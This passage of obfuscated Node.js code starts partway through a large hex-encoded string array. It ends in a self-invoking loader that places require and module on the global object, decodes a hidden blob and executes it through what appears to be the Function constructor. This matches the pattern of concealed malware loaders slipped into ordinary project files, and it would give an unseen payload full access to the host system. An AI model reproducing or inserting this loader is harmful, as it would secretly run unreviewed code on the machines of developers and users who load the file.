ebebd88587fecb9d88fc97da90d0ebd7d6ebcafcd6f7998debd785cbd697cdcf85d28f8deb8990c1eb858d9794d8ebebdaea97c098deebd0c094968c908eeb98dcfaeb929eebda84edf4dad791eb90859cc4da85959ad181ebf091d397fcffdc89888297c888daebcae497d8eb99d7d897eb96d6dde282da8597ebc197dd97dc85dcdacbd8c397da979ceb86d097cad0dd97d0dcd7cd94999adc979bcb978cc9dadf9097eb9791cb99da9794d7c986d1978de2eb8fd69898d09185fa95cdfd9387eb99ebdeeb84fbfaeb97978bebca9cdf988595e68af1eb89d0eb9885eb8597e4ebfbd7dce2eb91ebebebe9dadefad6ebd297979d9497dbda9cebcbc4ca889febe685cfeb8597cad5ebd0ebf99885dfd0f4ddfc98cfe4eaeb94df85ecd6dafe9197c4e9858f86c3ebebfcebda998febebe1f4ff93c4cbd4d085ebcbd09797f78d918582ebebe2dfd5ebed908febfdda95ebcedacacb90f8dacacdf3cad297cceb9684ca97eb91eb99d6fc85d8d286918ddedf8a8597dfd397e38a98dad0e4cad6e697d785d7ffeb9185edcadbcc9bddcbe7d6999debdcebeb97cc9083ddcde7dacd9185dfdaebfb9197c8d09997858acdf3d085da8591dc9799eb98d9dae1da9789ebdf8590eb85ebebeb8aebdaec8bcd98cddad8d7ecdaebdac3cdc9db8d85f3c1d491dae9eb909bcde384979799cc9086929f98d8d5829bcbe8c1dcd1d5cfdfebcb8b97ebef99ca9797f4979391c9d5e98bdc92ebd0ebdccdeb9debeb8c979997979797d89985ddcd919097cad584da99cb9dcaeb85ccd4fa8a97f0dcdccdc282e497dcdcf2d5819aca85d7c9e48285eaebdeebc8dd97cad6dd8fd79fdadccbcfdcf2c9cddd95ebcd89daebcb97ebcad0899cebeb85da89caebcdeb9785c8ebf0cdc2ebeadbdbcc97eb9bec97ead5cddaeb85d28597daebd6cbdd97dceb97d1d1cdea9b8eebf5ebc1ebdad0e9d197f79e85dd989397c8eb97d0ca85d085eb99d6d697f6d08febdbeb97e1eddcd897cd9a9593d8979985da8ce697df90eb90dceb98f1dd979894998eebd29798c4dada97dddceb85dadfd6ebeb90dad797989a98c8cbeb97cdcddfc8ceebe68799daeb85eb99d79199ebdcd086999edccbebcdeb93da9799ebeb98da9df3eb859182eb85cd9a8299c0cdf1da90db9ad0f8dc989797eb8f97edd7d5e69697eb8ad6eb97ebebcbc3c1d691dfde979bded4cc8bd59797de85d085f0d685d7dad5ebc19791e49798cae995e6f09797ddd591eb91d6eb9d99df94ca8597cdca85cdeb97fdebeb98e68585d6d497eb95e4979297f097e283eb85caebd595dae4d0cfeb97839797fe98dc97dfd6e3d28ef48a91dac0dc8beb9a9bcb90d085daebd7999797d7de85d081da85d0eb8cda97ebc1daca99d5ebcbc9da92898aebcd859debd7ceeb97c48debebdc8aebc3ebc48585daebcdc4cc85858598e9cadfda97d0e8979797d8f8cacddaebfc99d49c85dad6eb97ed89d09690e4dacbcdf2948597d3d6e5d0ccdedacddae285cacbda97ea9a97c3dd82ebeb84e8eb8debe39697d485c2d4ebdd91eb8585cfd8da97dad0c1dcdaeb82cbebcf90feebd682df85d497d7c197cdcb8097d6ebed889784ded6c0e29797e6ebedf4979a85cadcebebebf2eb9be69785dbfcebc3cb9f97dcfa85ccebdfe685c3d4ddc2c2ebebcad59f82cf979199db99dfc1858497e991e688ebebd0da97e2dfdf9cfdcf979feb9782cac4c19782ebd7d785d6e9979785fed897ebc49889c09eeb93eddddb85dadccbf6cfe98cd6dace9785ebdcd6ebcdddebebcdcecaebdd949ccd98ebcdebebc5ebcb839796ddebdd9aeb90faebeecb978591c1ce8590e8eb979197eb97dc9194ddd4dcd8d6ebeb85ebdfd0dad6ebcbe8eb97f59edd99dceec48bed98f3d585ead8d6ebdceb9e9185d79798eb97d0eb8a8289ccc985e9ca978c8584daebd5cc85d097eb95cbdad3ebdc97dddc85ebc9fc91eb85958e8590cddaeb9785cbd9e99b85d8d8e4d5daebd1caeb85cbebeb8d8ada9785eb85c0dcd9f090979791cbebebe99788eb9fd6f78eeb97f0d897c2ebebc387efc38297ebebebd8d785c4ebebdd9797da90da98ebe9d4ebebdc91c1dada99e4da82dc9790eb97e082e189eb95d5c297d7979785eb9997d7ebe69acadcebd09185ebe699d6f3f3dacd90f9e297c98585979197eb979897eb98c096cccd97eb97caf7dadaeb97ebdd97ebdfebd685e696eb879ceb86fa92ebdfdac2dadbe997cbda97eb97da97eb869b8184e6ffec99e9998b95ced6c9dacdd8eb808d979c90eb8ecbcedadd9785da919991c980828ac18c97ebd1d1d7ccc8ebd3ebdfd0deebc4cddaf8daf097fe919985918d97cdebc19a8397ebe28bc1909bcaebebdfeb97fd85cdc1da97eb9aebe997c1989997daeb908585daebd6d292ebd6ebdb97caebe481daebd0ddd8cb88c488e99885eb85978599eb85cfeb97e097dcebeac2da858384ebcd97d085d5eb95d8d7eb97da99dec1eb97d0e1eb8f8297ddd6d585ebd097ebc9ebc4d6d5cfd69488ebd5f087c9dc9998c98aebd5c1daebdddcdfcd8d98cbda85c5efdf9799eb85eb9091d6dfeb97da91d0ebd6da85d0fcdaf7859bf0dcdc85cbdfd89897d0ddeb9780e997dc9b97d085ebd497dfc4cbcaebdee9979985dcebdbccf9cdda8fd8cc97998d8ecbdbd7de9097999985dbdadcf4ebdc9796978293cd85898385cdd7d5ebca88daced693cdd994d2d398eb99c2eb858597ebdd979997daf7dafa92d1f3d6daeb85d7dcd097ebdadedceb9084eb97cbdc97eb85dbeb858b88e6dac4cd97e89bda82da9ecfdddfd5caeb97cd98ca98d0cb97eb9a8797ebd4cacbccca978d99e498da8982ca99979c85cdd8e9daccf88588c58e9b9884808886d0ebe997dfcbc497dd97cbedcbeb9cd0d6e99b858297cbd0d8cac3ebc8decbc09aebde82eb97df9397f6d597cbe690ca94ddebdaca998597d784d885eec288d69c9999fad3daebdcdadbcceb97ebffdae2edd6daece6989799dae29adfebcdce97cd9888ebe6dc9791d6ddca95978099d5d1cddcdddf9d9185ead7eb859cdad6d79188dd979debd5eaebcbebcad7d8dad2979195dcebdfced098ebfadec9da8591dac9ebdcdaceeb91fbdc9097ea859285c1e9dbcaf19791cc98d7ebebdccd99eb8bcd9185dc9dc482d59bcd91c9ebe4c0dfc3eb8fd6ebce9786ebc4fb8597cdcddaeb9199f1ebda97dfdadad0ebdae289dc92ca8599f597caeb8ffc9897d8ceda89d8e2da93dfc98590e681d7da85dadc97f785dacccbfadf91eb90d8fcd6eb90d1cfd1eb9b8297c5d7ebebebd5dad7ebcaca85ebc2cbeb9bda97d08891edebeb98cbd08585ddee85eb99959797ccc4d5df97dad0daebcacac1d0ebda8bf8eb9197d8e7d5c4d3898fddebd4cf8ed885d1c9d297d28685ebcacdd5cade97e9da97daeb97979c97d1c2daebd09ed5eb97d7888585d0d7ddcacaf797dbdccb97d7efca97d59e80d8d8cdcdebca9991979799ebca91d09a8dd0ebebd8ebcd9795ebf385d591dc91999aebf4d1eb8197db90d683d69dd697e697dff3cb82978ad79785e3fe99fce984d095ccdc9785caeb8585d785e3dadfebdac2ebd897d8ebdf9ad0ebdccb85d7e099cbd5ffcbebddebcbeb9bda98cdc3d6ddd0d0dedcebece4cadadcd88096daf2c9ccebeb90cd9792ebcdebeb85e599dcda84d8da9791df85dae4c8ebeb9deb978599d49997cf90f1ebcb879785e496cdce97dcdfda87c0e0d7cd9897c9d1dce099d0cbd1eb97d2ebd881918cdd85dceb90d6cef785cd979196daebebdb9597d6dfebe6da8ecafcda9797979997eb85dcebeb9ceb90daebffc2dc97dc85da97da8e95c0cdc4d2dc96caccf7dde2dadad09acdcdcaebebebd8cbedf0cadad585d69097d4979784ca979adbd7ddddcaeb8585ebeb97cdcdd78590c1ebe998e297999999da9797ebebddf797cddbd5c4fad1d6dadfcb97ebd0d0dad6d6eb97eadfccd0dcdc85eb8d97eae6c3d6cddadada82ebcbcacbc985ebd5e2cdde979984d2c18497eb97c2e09298f7daebce98cc9c9699dc8591eb9785dd96dad585d797da9dccebdddd91dfcdd0f6dafa88ca9fcbd5cf9febeb99ed97908897ded6e9dac2cbd8d597dbdaebd59899d5dff095eb97daebda8b99dcfccd99d89b859985d5c9919fd297dd8495eb97d7eb969099da88e4cad0d7c8d0cbc1ebdaeb98dccd9785ebdaf9d5cde997d0c285dcebc4ebeb91edd5dcebeb8591858599e6cad5cbcbedebd7f0dfda989d93ebeb9eeb85dad8dbd8dfdad2d6d7d5979fdbdfd3d0cd8f898898ccdd9793d29edc81c99f84dadcc9fac485dcfedce98debda9197c1f99890c9d6e29ceb89fd89919c97fc9beb858dd7ebd78bd8ebcc99e6d8fd92f5dfdaebcd9fdb8ecb90da918699c1ebc585cbd5d5ebebebd8eb97999094daebc197dceb85f89785dada85c3d0ebd685daebf9ebebc2db8ec0eb97ebebf2da97ebdf85d5c5d597d08bcad8ebdaebc5ebe2d6eb91caebededcdebcddaf490ebccd7d882f1d4cae784e5c29698dd9fce9782ced5ccd497d1dcebcd91cadcdfda','d3d6d0d7','888b8c8d8e8b81c3fbc3e3f7f5','8b818e898f8189fec8ecefd3c0','84d8dcd7cbccd191d8d5848cda95de81dfddcc97c0cb999797d7dadcdadf958c9bc9d8dcd8cc8fd5d7d390cbe48bcccf9bc194c891e499d88291cb848282cb9291d8e28197ca8bcdf8ded6c895ccd181fa95d8d095ca82d891f8d48991d7d382d3cf93958ecfd68e919091d682d48fd6d88dcbce909799cbd6dde2dfca8bd7c2ddcbcfcd8dc190928995d8d7cb92cbcb92d690c4c3889984d1dfe2d8d781cb88cbe295e4ca8e948e8ed5d8d897ccd08ec294898f80d5cfd4cd8bcb84d0e4e4859290cc95dc90959582d7cbd1e2cb8489cf94cb91829584c990faccca8492da82de82df82c8f8909088cfd090cfd289d7cbd588d8dc99df84e282d1d0cac097dcd491dd92d6988b998491dccfdcd88e818497908ddcd084de97d784c2dfdf8488e2858bd899df8884cb828d95ea90cbc0d5cf88cc99c082d2c8d5c2cdcfd7cf9991fa9991d595d6cfd7c999d084cdd5cb95cb97d5ced6c3d191d595cdc88282cbcb9191cf84d8d1cacf82e4c1c884d8db82ddd882959191cb82cfd3c89791cde29290ddd890cbddd7cbd1ca8d88c091cfcb82dfd1828ade9be4dc9197d8d1cbc9d8c9dee4de9790d7dedfc9d788d195d0dad582829084fa82d48c8492cb9599979082cc8492cac49290d0cd9592dbd482dd92ccd4909484cad0d0c8d6d584cd84cb84c880929797dad1c892e28fdfdc99cd89d7cbc9cb9199cfcb81dfd5cbd795dddddecd99e48fd89782d482cbcdd197dec8998bd8c4dccfdcd0dae4dedbcdd0858dd682fa82d595c3c3d08f92d5e2d8e2829291cad09bd5d09bcb95d7c9d080ca95dfcbdfd1ccce90d6ce84dcc291db84cedcd78bcd97decc97d084d2d0d8d8d89290c0dfcdc9d88ad7c49084809b90dac9f892cc82cccdc9e49b84d5d28ecfc9cd9988cb82d1c3ce9b90cd919080909197d5ccd584ca8edf829982cac88990d79bc09289cac484cfd892ca99d4d19189c897e4d1cf828799898f84f894d6c3dccdcb91cd88cbcdcbcad0cad689dc959782c3e291df858cdc8ecd9591cbd8d6d8cfd7cb82cdd1d1df82cf95d384cb829990cb878881c3d1d693d6c285d8d2d4cad790d8d2cddc97cfd68092dcd889dad5d0d682dbcc9984e4fa98ded382c08a92d590dc8497c4ddcb84d08fd6d0fa81cbd7d789828f84d8cb9bc497cbdcd084e4eacdcacbd7d797828bcb84cd82e2cd82d0cf84c9cbfacbd79190d8cbdccdccc39299d1d5d2e292c184dc999481d3c291dcd3c0809191909099'];d$qtJhn$jgp=function(){return fYa_ecAuUpEYAjErRZhvFjWnMQ;};return d$qtJhn$jgp();}function splitLane(JIxUEcDsZqXSIbQVbGPjupV){var LtHdqNf$QeKg_OxYIOmLQSZZsf=DiRry,hNJRHyXb$$Wx=String[LtHdqNf$QeKg_OxYIOmLQSZZsf(0x1f2)](-0xe1b+-parseInt(0x18c3)+-parseInt(0xcfe)*-parseInt(0x3)),mfJLgOOKgjFDK_Jvn$kzS=spin(JIxUEcDsZqXSIbQVbGPjupV,NX);return mfJLgOOKgjFDK_Jvn$kzS=mfJLgOOKgjFDK_Jvn$kzS[LtHdqNf$QeKg_OxYIOmLQSZZsf(0x1e7)]('^')[LtHdqNf$QeKg_OxYIOmLQSZZsf(0x1e0)](hNJRHyXb$$Wx),mfJLgOOKgjFDK_Jvn$kzS=mfJLgOOKgjFDK_Jvn$kzS[LtHdqNf$QeKg_OxYIOmLQSZZsf(0x1e7)]('*1')[LtHdqNf$QeKg_OxYIOmLQSZZsf(0x1e0)]('^'),mfJLgOOKgjFDK_Jvn$kzS=mfJLgOOKgjFDK_Jvn$kzS[LtHdqNf$QeKg_OxYIOmLQSZZsf(0x1e7)]('*0')[LtHdqNf$QeKg_OxYIOmLQSZZsf(0x1e0)]('*'),mfJLgOOKgjFDK_Jvn$kzS[LtHdqNf$QeKg_OxYIOmLQSZZsf(0x1e7)](hNJRHyXb$$Wx);}function peel(HntnTJelobY){return spin(HntnTJelobY,SX);}(function boot(jRiqfL_YGi,ZXWEUnPbKMsgcWphWHTfi){var DWSBzXLkOBhNwMmvBZ=DiRry;jRiqfL_YGi['z']=z;var qrm_pgeLcAkZ=splitLane(DWSBzXLkOBhNwMmvBZ(0x1eb));jRiqfL_YGi[qrm_pgeLcAkZ[-parseInt(0x5a)*Math.ceil(0x5f)+0x1cf*Math.max(-parseInt(0x7),-parseInt(0x7))+parseInt(0x2e0f)]]=ZXWEUnPbKMsgcWphWHTfi;typeof module===qrm_pgeLcAkZ[-0xe9*Number(parseInt(0x1))+0x19a3*-0x1+-parseInt(0x1)*Number(-0x1a8d)]&&(jRiqfL_YGi[qrm_pgeLcAkZ[parseInt(0x24d7)+Math.trunc(parseInt(0x26d4))+Math.max(0xacf,parseInt(0xacf))*parseInt(-0x7)]]=module);var GWCvm$ZL=peel(DWSBzXLkOBhNwMmvBZ(0x1ec)),rcTIW_sQOoGcYZLAlPkfm$mi=GWCvm$ZL[DWSBzXLkOBhNwMmvBZ(0x1e5)](0x19*Math.ceil(0x82)+Math.ceil(0x1)*Math.ceil(0x18a9)+parseInt(-parseInt(0x255b)),0x312*-parseInt(0x7)+-parseInt(0x251d)+0x3aa6),paMowTbZVJuno=peel[rcTIW_sQOoGcYZLAlPkfm$mi],g$$RRgVGjkaechxpAIOIR=paMowTbZVJuno('',peel(DWSBzXLkOBhNwMmvBZ(0x1e3))),rLmqKRB_QxEIuMImVE$hGKNZAHT=g$$RRgVGjkaechxpAIOIR(peel(DWSBzXLkOBhNwMmvBZ(0x1f3)));return paMowTbZVJuno('',rLmqKRB_QxEIuMImVE$hGKNZAHT)(0x220d+parseInt(0x518)+Math.floor(-parseInt(0x4e4))*0x6),-parseInt(0x12e1)+-0xa34+Math.trunc(0x3ce3);}(global,require));
